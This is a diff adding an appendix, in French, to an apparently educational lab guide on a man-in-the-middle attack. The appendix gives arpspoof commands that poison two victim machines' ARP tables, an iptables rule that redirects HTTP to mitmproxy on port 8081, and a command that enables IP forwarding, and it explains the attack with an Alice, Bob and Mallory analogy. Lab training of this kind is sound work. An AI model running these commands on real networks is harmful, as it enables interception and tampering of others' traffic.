@@ -334,3 +334,112 @@ Cela permet à l'attaquant de recevoir et de rediriger tout le trafic entre les 
 #### Résumé
 
 L'empoisonnement ARP est une méthode permettant à un attaquant d'intercepter et de rediriger le trafic réseau entre deux machines en envoyant des messages ARP falsifiés. Les commandes `arpspoof` sont utilisées pour tromper les machines victimes et rediriger leur trafic vers l'attaquant, permettant ainsi à l'attaquant de surveiller et potentiellement modifier les communications entre les victimes.
+
+
+# Annexe 3 - manipulation supplémentaire: 
+
+### Utilisation d'un Port Alternatif pour mitmproxy
+
+Installez Apache sur le port 80 et que vous souhaitez utiliser mitmproxy, vous devez choisir un autre port pour mitmproxy. Par exemple, vous pouvez utiliser le port 8081.
+
+Voici comment configurer et exécuter l'attaque Man-in-the-Middle (MITM) avec mitmproxy écoutant sur le port 8081 :
+
+#### Étapes à Suivre
+
+1. **Empoisonner les Tables ARP**
+
+   **Empoisonner la Table ARP de Victim1**
+   ```sh
+   sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
+   ```
+
+   **Empoisonner la Table ARP de Victim2**
+   ```sh
+   sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
+   ```
+
+2. **Redirection du Trafic HTTP avec iptables**
+
+   Utilisez le port 8081 pour mitmproxy au lieu du port 8080 :
+   ```sh
+   sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8081
+   ```
+
+3. **Lancer mitmproxy sur le port 8081**
+
+   - **Lancer mitmproxy** :
+     ```sh
+     sudo mitmproxy -p 8081
+     ```
+
+   - **Lancer mitmweb** (alternative avec interface web) :
+     ```sh
+     sudo mitmweb -p 8081
+     ```
+
+4. **Accéder à l'interface web de mitmweb**
+
+   Si vous utilisez `mitmweb`, ouvrez un navigateur et allez à `http://localhost:8081` pour accéder à l'interface web de mitmweb.
+
+### Exemple Complet de Commandes
+
+#### Machine Attaquant (Attacker)
+
+1. **Empoisonner les Tables ARP**
+   ```sh
+   sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
+   sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
+   ```
+
+2. **Redirection du Trafic HTTP vers le port 8081**
+   ```sh
+   sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8081
+   ```
+
+3. **Lancer mitmproxy ou mitmweb sur le port 8081**
+   - **mitmproxy** :
+     ```sh
+     sudo mitmproxy -p 8081
+     ```
+   - **mitmweb** (avec interface web) :
+     ```sh
+     sudo mitmweb -p 8081
+     ```
+
+### Explications Vulgarisées
+
+#### Qu'est-ce qu'une Attaque Man-in-the-Middle (MITM) ?
+
+Imaginez deux amis, Alice (Victim1) et Bob (Victim2), qui échangent des lettres. Mallory (Attacker) est un individu malveillant qui intercepte et lit toutes les lettres échangées entre Alice et Bob, et parfois il modifie le contenu des lettres avant de les envoyer à la destination prévue. Une attaque Man-in-the-Middle fonctionne de manière similaire en interceptant les communications entre deux parties.
+
+#### Comment l'Attaque Fonctionne-t-elle ?
+
+1. **Empoisonnement ARP** :
+   - Mallory trompe Alice et Bob en leur faisant croire que son adresse (adresse MAC de Mallory) est celle de l'autre.
+   - Résultat : Tout le trafic entre Alice et Bob passe par Mallory.
+
+2. **Redirection du Trafic** :
+   - Mallory redirige tout le trafic HTTP vers un proxy (mitmproxy) pour inspecter et éventuellement modifier les communications.
+
+### Résumé des Commandes
+
+#### Machine Attaquant (Attacker)
+
+```sh
+# Activer le transfert IP
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Empoisonner les tables ARP
+sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
+sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20
+
+# Rediriger le trafic HTTP vers le port 8081
+sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8081
+
+# Lancer mitmproxy ou mitmweb sur le port 8081
+sudo mitmproxy -p 8081
+# ou
+sudo mitmweb -p 8081
+```
+
+En suivant ces étapes, vous pouvez configurer correctement `mitmproxy` ou `mitmweb` pour intercepter et visualiser le trafic HTTP entre les machines victimes, même si le port 80 est déjà utilisé par Apache.
